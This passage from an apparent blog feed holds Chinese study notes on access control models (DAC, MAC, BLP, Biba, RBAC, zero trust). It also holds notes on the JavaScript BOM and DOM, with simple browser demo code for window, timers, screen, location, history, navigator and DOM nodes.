title="自主访问控制模型（DAC）"></a>自主访问控制模型（DAC）</h4><ul><li>允许客体（文件）的创建者决定主体对该客体的访问权限。</li><li>linux系统的权限赋予</li><li>无法控制信息流动：主体对客体的访问权限看可以传递给其他用户</li><li>特洛伊木马威胁</li><li>实现机制：访问控制表&#x2F;矩阵</li><li>实现方法：<ul><li>访问控制表</li><li>访问能力表</li></ul></li><li>访问许可：<ul><li>改变访问模式的能力，或传递这种能力的能力</li><li>类型：等级型、有主型（客体的创建者）、自由型</li></ul></li><li>访问模式：<ul><li>主体对客体访问权，指主体对客体的任何形式的访问权限（orwe）</li></ul></li><li>优点：根据主体身份决策（灵活）</li><li>缺点：信息在传递过程中权限关系会改变</li></ul></li><li><h4 id="强制访问控制模型（MAC）"><a href="#强制访问控制模型（MAC）" class="headerlink" title="强制访问控制模型（MAC）"></a>强制访问控制模型（MAC）</h4><ul><li><p>和主体对客体按照强制访问控制策略控制</p></li><li><p>安全级别：</p><ul><li>每个客体和主体分配一个固定安全级别</li><li>不是主体的安全级别高于客体才能访问</li><li>上读、下写、下读上写（方向式从用户的角度看）<ul><li>下读上写：机密性<ul><li>不能上读，不能下写</li></ul></li><li>上读下写：完整性<ul><li>不能下读，不能上写（上面下发文件）</li></ul></li></ul></li></ul></li><li><p><strong>BLP</strong>：</p><ul><li>下读上写——机密性（同级不可读，可写）</li><li>应用：防火墙<ul><li>只许外进，不许内（机密）出</li><li>里面的可以读外面的</li></ul></li></ul></li><li><p><strong>Biba</strong>：</p><ul><li>上读下写——完整性</li><li>web服务器（服务器机密，用户公开）</li><li>用户可读，但是不可写</li></ul></li><li><p><strong>Lattice</strong>：</p><ul><li>下读下写</li></ul></li></ul></li></ul><table><thead><tr><th>自主访问</th><th>强制访问</th></tr></thead><tbody><tr><td>细粒度</td><td>控制粒度大</td></tr><tr><td>灵活性高</td><td>灵活性不高</td></tr><tr><td>配置效率低</td><td>安全性强</td></tr><tr><td>非集中</td><td>集中</td></tr></tbody></table><ul><li><h4 id="基于角色的访问控制（RBAC）"><a href="#基于角色的访问控制（RBAC）" class="headerlink" title="基于角色的访问控制（RBAC）"></a>基于角色的访问控制（RBAC）</h4><ul><li><p>用户有角色，角色请求权限，有了权限以后再进行访问能控制</p></li><li><p>基本思想：用户要扮演某种角色，根据角色来决定用户在系统中的访问权限。</p></li><li><p>是基于组的策略</p></li><li><p>模型组成（一）</p><ul><li>用户（ｕｓｅｒ）</li><li>角色（ｒｏｌｅ）</li><li>权限（ｐｅｒｍｉｓｓｉｏｎ）</li><li>用户分配（user　Assignment）<ul><li>用户与角色关联</li></ul></li><li>权限分配（Permission　Assignment）<ul><li>角色与权限关联</li></ul></li><li>激活角色<ul><li>角色只有激活才起作用</li><li>通过会话激活角色</li></ul></li><li>会话</li></ul></li><li><p>用户、角色、许可的关系</p><ul><li>用户角色多对对</li><li>角色许可　多对多</li><li>许可＝操作+客体，操作、客体多对多</li></ul></li><li><p>实例：银行</p></li><li><p>角色继承</p><ul><li>避免角色权限重复设置</li><li>子角色可以继承其他角色的部分许可</li></ul></li><li><p>角色管理</p></li><li><p>角色激活</p><ul><li><table><thead><tr><th>用户</th><th>会话</th></tr></thead><tbody><tr><td>静态</td><td>动态</td></tr><tr><td></td><td>用户的一个活跃进程</td></tr><tr><td></td><td>可为用户激活几个角色</td></tr><tr><td></td><td></td></tr></tbody></table></li></ul></li><li><p>角色限制</p><ul><li>角色互斥（对某些特定的操作集，用户不能同时拥有）（会计、出纳）</li><li>静态角色互斥、动态角色互斥</li><li>角色基数限制：（设置角色基数）</li></ul></li><li><p>RBAC96（画图）</p></li><li><p>改进：即可对用户授权又可以基于角色授权</p></li><li><p>总结：</p><ul><li>便于授权管理</li><li>便于处理工作分级</li><li>利用安全约束</li><li>便于任务分担</li></ul></li></ul></li></ul><h2 id="14-零信任安全（ZTA）"><a href="#14-零信任安全（ZTA）" class="headerlink" title="14*.零信任安全（ZTA）"></a>14*.零信任安全（ZTA）</h2><ul><li>零信任既不是技术也不是产品，而是一种安全理念。</li><li><img src="/2023/11/10/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/image-20231117082658057.png" alt="image-20231117082658057"></li><li><img src="/2023/11/10/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/image-20231117082641958.png" alt="image-20231117082641958"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 风险评估、风险处置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS</title>
      <link href="/2023/11/08/JS/"/>
      <url>/2023/11/08/JS/</url>
      
        <content type="html"><![CDATA[<h1 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h1><h3 id="1-定义："><a href="#1-定义：" class="headerlink" title="1. 定义："></a>1. 定义：</h3><img src="/2023/11/08/JS/image-20231108193849908.png" alt="image-20231108193849908" style="zoom:150%;"><ul><li>我们将js可以控制的对象叫做浏览器对象，具体包括：</li></ul><p><img src="/2023/11/08/JS/image-20231108194042392.png" alt="image-20231108194042392"></p><h2 id="2-Window对象"><a href="#2-Window对象" class="headerlink" title="2. Window对象"></a>2. Window对象</h2><ul><li><p>除了bom外，window对象是所有浏览器对象的父对象</p></li><li><p>基本读取操作：</p><p>- </p>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> globleVar=<span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 基本属性</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">document</span>.<span class="title function_">write</span>(<span class="string">&quot;全局变量:&quot;</span>,<span class="variable language_">window</span>.<span class="property">globleVar</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;innerHeight:&quot;</span>,<span class="variable language_">window</span>.<span class="property">innerHeight</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;innerWidth:&quot;</span>,<span class="variable language_">window</span>.<span class="property">innerWidth</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;outerHeight:&quot;</span>,<span class="variable language_">window</span>.<span class="property">outerHeight</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;outerWidth:&quot;</span>,<span class="variable language_">window</span>.<span class="property">outerWidth</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">// 基本方法</span></span><br></pre></td></tr></table></figure></li><li><p>弹窗操作（浏览器环境）——nodejs不生效</p><ul><li><pre><code class="js">const ret=alert(&quot;我是一个弹出窗口&quot;);    document.write(&quot;alert return value:&quot;,ret);    document.write(&quot;&lt;br&gt;&quot;);    // 确定窗口    const ret1=confirm(&quot;我是一个确定端口&quot;);    document.write(&quot;confirm return value:&quot;,ret1);    document.write(&quot;&lt;br&gt;&quot;);    // 提示窗口    const ret2=prompt(&quot;请输入关键字：&quot;);    document.write(&quot;prompt return value:&quot;,ret2);    document.write(&quot;&lt;br&gt;&quot;);<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">- 关于document.write的说明：</span><br><span class="line"></span><br><span class="line">  - 本来的语义是在网页的末端添加内容。但是如果网页已经加载完，再使用document.write()，此时则是创建一张新的网页</span><br><span class="line"></span><br><span class="line">  - </span><br><span class="line"></span><br><span class="line">    ```html</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">      &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">      &lt;title&gt;关于document.write&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;about document.write&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;本来的语义是在网页的末端添加内容。&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;但是如果网页已经加载完，再使用document.write()&lt;/p&gt;</span><br><span class="line">      &lt;strong&gt;此时则是创建一张新的网页，请看本例&lt;/strong&gt;</span><br><span class="line">      &lt;button onclick=&quot;myclick()&quot;&gt;document.write()测试&lt;/button&gt;</span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        function myclick()&#123;</span><br><span class="line">          document.write(&quot;hello document.write&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>定时器</p><ul><li><pre><code class="js">// setInterval()和setTimeout是异步函数，异步函数等后面的同步函数执行完了，再执行。// setTimeout,定时器程序，指定时间之后执行某项操作function f () &#123;    console.log(1);    setTimeout(function () &#123;console.log(2)&#125;, 1000);    setTimeout(function () &#123;console.log(3)&#125;,0)    setTimeout(function () &#123;console.log(4)&#125;, 0);    console.log(5);&#125;;function f1()&#123;    var st=setTimeout(function()&#123;        console.log(&quot;我被取消了，不会执行&quot;);    &#125;,1000);    clearTimeout(st);&#125;f();f1();*****************************************    15342先清除后执行settimeout，所以不会执行：var st=setTimeout(function()&#123;        console.log(&quot;我被取消了，不会执行&quot;);    &#125;,1000);<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;定时器&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      // setInterval:间隔指定时间执行一个操作</span><br><span class="line">        var timeline;</span><br><span class="line">        function myTime()&#123;</span><br><span class="line">            var t = new Date();</span><br><span class="line">            var mt=t.toLocaleTimeString();</span><br><span class="line">            document.getElementById(&quot;time&quot;).innerHTML=mt;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        function start()&#123;</span><br><span class="line">            timeline=setInterval(myTime,1000);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        function end()&#123;</span><br><span class="line">            clearInterval(timeline);</span><br><span class="line">        &#125;;</span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;定时器实例&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;begin&quot; onclick=&quot;start()&quot;&gt;开始计时&lt;/button&gt;</span><br><span class="line">    &lt;p id=&quot;time&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;button id=&quot;end&quot; onclick=&quot;end()&quot;&gt;结束计时&lt;/button&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h3 id="3-screen对象"><a href="#3-screen对象" class="headerlink" title="3. screen对象"></a>3. screen对象</h3><ul><li>属性：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>screen对象<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>screen对象包含了客户显示器端信息<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>height:显示器高度<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>width:显示器宽度<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>colorDepth:显示器颜色深度<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>availHeight:可用高度<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>availWidth:可用宽度<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 主要是描述了客户显示设备的物理信息，这些信息都是只读的</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;display height:&quot;</span>,screen.<span class="property">height</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;display width:&quot;</span>,screen.<span class="property">width</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;display color depth:&quot;</span>,screen.<span class="property">colorDepth</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;display avaiable height:&quot;</span>,screen.<span class="property">availHeight</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;display avaiable width:&quot;</span>,screen.<span class="property">availWidth</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-location对象"><a href="#4-location对象" class="headerlink" title="4. location对象"></a>4. location对象</h3><ul><li><p>用于url管理</p></li><li><pre><code class="html">&lt;body&gt;  &lt;h1&gt;location 对象&lt;/h1&gt;  &lt;p&gt;location对象是用来对浏览器中的URL进行管理的&lt;/p&gt;  &lt;h2&gt;基本属性&lt;/h2&gt;  &lt;ul&gt;    &lt;li&gt;href:完整的URL&lt;/li&gt;    &lt;li&gt;protocol:URL用到的协议&lt;/li&gt;    &lt;li&gt;host:url中的主机信息&lt;/li&gt;    &lt;li&gt;hostname:主机名信息&lt;/li&gt;    &lt;li&gt;port:端口号信息&lt;/li&gt;    &lt;li&gt;hash:用来只是网页的局部信息&lt;/li&gt;    &lt;li&gt;search:URL中搜索信息&lt;/li&gt;    &lt;h2&gt;基本方法&lt;/h2&gt;    &lt;ul&gt;      &lt;li&gt;assign():切换网页当前的URL，会被history记录&lt;/li&gt;      &lt;li&gt;replace():更换网页URL记录，但是不会被history记录&lt;/li&gt;    &lt;/ul&gt;  &lt;/ul&gt;  &lt;script&gt;      location.assign(&quot;http://www.scu.edu.cn&quot;);  &lt;/script&gt;&lt;/body&gt;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 5. history对象</span><br><span class="line"></span><br><span class="line">- 一个属性 三个方法：</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;history对象&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;对浏览器的历史记录进行管理&lt;/p&gt;</span><br><span class="line">  &lt;h2&gt;基本属性&lt;/h2&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li&gt;length: 历史记录的条数&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">  &lt;h2&gt;基本方法&lt;/h2&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li&gt;back():回退操作&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;forword():前进功能&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;go(num):后退或者前进的次数&lt;/li&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    location.assign(&quot;http://www.scu.edu.cn&quot;);</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></code></pre></li></ul><h3 id="6-navigator"><a href="#6-navigator" class="headerlink" title="6.navigator"></a>6.navigator</h3><ul><li><p>基本属性</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">body&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>navigator对象<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>用于获取浏览器中的相关信息<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>appName:浏览器名<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>appVersion:浏览器版本号<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>language:语言名字<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>userAgent:浏览器信息<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>cookieEnable:是否允许cookie<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>javaEnable:是否允许java<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>platform:浏览器所在平台信息<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>plugin: 插件信息，是一个结构对象。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>plugin.name:插件名字<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>plugin.description:插件描述<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>plugin.filename:插件对应的文件名<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>plugin.lenth:插件支持的MIME数量<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>构建爬虫之前的信息采集常用</p></blockquote></li><li><p>​基本方法</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser name:&quot;</span>,navigator.<span class="property">appName</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser version:&quot;</span>,navigator.<span class="property">appVersion</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser user-agent:&quot;</span>,navigator.<span class="property">userAgent</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser support language:&quot;</span>,navigator.<span class="property">language</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser cookie:&quot;</span>,navigator.<span class="property">cookieEnabled</span>?<span class="string">&quot;yes&quot;</span>:<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser java:&quot;</span>,navigator.<span class="title function_">javaEnabled</span>()?<span class="string">&quot;yes&quot;</span>:<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;browser platform:&quot;</span>,navigator.<span class="property">platform</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> plugin <span class="keyword">of</span> navigator.<span class="property">plugins</span>)&#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;plugin name:&quot;</span>,plugin.<span class="property">name</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;plugin description:&quot;</span>,plugin.<span class="property">description</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;plugin filename:&quot;</span>,plugin.<span class="property">filename</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;plugin Mime support number:&quot;</span>,plugin.<span class="property">length</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h3><p><img src="/2023/11/08/JS/image-20231108202747351.png" alt="image-20231108202747351"></p><h2 id="2-节点类型"><a href="#2-节点类型" class="headerlink" title="2. 节点类型"></a>2. 节点类型</h2><h4 id="1、文档节点"><a href="#1、文档节点" class="headerlink" title="1、文档节点"></a>1、文档节点</h4><ul><li><code>document</code></li><li>重点记忆属性：<ul><li>nodeType（节点类型）：9</li><li>nodeName（节点名字）：“#document”</li><li>nodeValue（节点文本内容）：null</li><li>childNodes：nodelist[]</li></ul></li></ul><h4 id="2、元素节点"><a href="#2、元素节点" class="headerlink" title="2、元素节点"></a>2、元素节点</h4><ul><li>所有元素标签</li><li>重点记忆属性：<ul><li>nodeType（节点类型）：1</li><li>nodeName（节点名字）：“大写标签名”（P）</li><li>nodeValue（节点文本内容）：null</li><li>childNodes：nodelist[]</li></ul></li></ul><h4 id="3-属性节点"><a href="#3-属性节点" class="headerlink" title="3. 属性节点"></a>3. 属性节点</h4><p><img src="/2023/11/08/JS/image-20231108204103698.png" alt="image-20231108204103698"></p><h4 id="3、文本节点"><a href="#3、文本节点" class="headerlink" title="3、文本节点"></a>3、文本节点</h4><ul><li>文字、标签之间的空格和换行也被当作文本节点</li><li>重点记忆属性：<ul><li>nodeType（节点类型）：3</li><li>nodeName（节点名字）：“#text”</li><li>nodeValue（节点文本内容）：文本内容</li><li>childNodes：nodelist[]</li></ul></li></ul><h4 id="4、注释节点"><a href="#4、注释节点" class="headerlink" title="4、注释节点"></a>4、注释节点</h4><ul><li>注释内容</li><li>重点记忆属性：<ul><li>nodeType（节点类型）：8</li><li>nodeName（节点名字）：“#comment”</li><li>nodeValue（节点文本内容）：注释内容</li><li>childNodes：nodelist[]</li></ul></li></ul><blockquote><p>也就是说文本内容也是节点对象</p><p>本质上是API接口，认可程序可以调用</p></blockquote><h3 id="2-操作："><a href="#2-操作：" class="headerlink" title="2. 操作："></a>2. 操作：</h3><ul><li><h4 id="找节点"><a href="#找节点" class="headerlink" title="找节点"></a>找节点</h4><ul><li><code>document.getElementById();</code>:唯一的</li><li><code>document.getElementByTag(&quot;P&quot;)</code>:ret: nodelidt[]</li><li><code>document.getElementByClass()</code>:ret：nodelist[]</li><li><code>document.getElementByName()</code>:</li><li><code>querySlector(&quot;div.lg&quot;)</code></li><li><code>querySlectorAll()</code>:数组</li></ul></li><li><h4 id="对节点增删改查"><a href="#对节点增删改查" class="headerlink" title="对节点增删改查"></a>对节点增删改查</h4><ul><li><p>获取节点内容：</p><ul><li>innerHTML：包括标签和内容</li><li>innerTEXT：只获取文本内容</li></ul></li><li><blockquote><p>my&#x3D; document.getElementById(“”);</p><p>my.innerHTML &#x3D; “<script>  </script>“标签会被解析——xss</p></blockquote></li><li><p>修改节点属性</p><ul><li>Element.属性名</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>bulbon example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./pic/off.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bulbon&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;change()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 通过:节点.属性名获取属性值 通过：节点.属性值=newValue;改变值</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">change</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> node=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bulbon&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span 